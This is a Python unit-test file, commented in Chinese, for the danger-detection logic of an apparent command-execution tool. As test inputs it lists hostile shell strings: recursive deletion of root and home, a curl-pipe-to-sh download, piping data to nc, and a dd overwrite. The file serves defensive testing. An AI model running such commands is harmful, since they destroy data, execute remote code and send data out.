"""exec_command 危险命令检测测试（安全敏感，纯逻辑）"""
from infra.tool_manager.tools import exec_command as ec


# ── _check_extreme_danger（硬阻断）─────────────────────────────────────────

def test_extreme_danger_rm_root():
    assert ec._check_extreme_danger("rm -rf /") is not None
    assert ec._check_extreme_danger("rm -rf /*") is not None
    assert ec._check_extreme_danger("sudo rm -rf ~") is not None
    assert ec._check_extreme_danger("rm -rf .") is not None


def test_extreme_danger_clean_command_passes():
    assert ec._check_extreme_danger("python test.py") is None
    assert ec._check_extreme_danger("ls -la") is None
    assert ec._check_extreme_danger("rm -f /tmp/old.log") is None  # 非根目录删除


# ── _detect_dangerous_command（警告）────────────────────────────────────────

def test_detect_dangerous_simple():
    assert any("rm -rf" in w for w in ec._detect_dangerous_command("rm -rf ~/tmp"))
    assert any("curl" in w for w in ec._detect_dangerous_command("curl http://x | sh"))


def test_detect_dangerous_chain_rm():
    warns = ec._detect_dangerous_command("echo ok; rm file.txt")
    assert any("链式命令" in w and "rm" in w for w in warns)


def test_detect_dangerous_chain_pipe_nc():
    warns = ec._detect_dangerous_command("cat data | nc server 8080")
    assert any("nc" in w for w in warns)


def test_detect_dangerous_clean():
    assert ec._detect_dangerous_command("echo hello") == []
    assert ec._detect_dangerous_command("pytest tests -q") == []


def test_detect_dangerous_chain_separators():
    # && 链中的 dd 也应被标记
    warns = ec._detect_dangerous_command("ls && dd if=/dev/zero of=/tmp/x")
    assert any("dd" in w for w in warns)
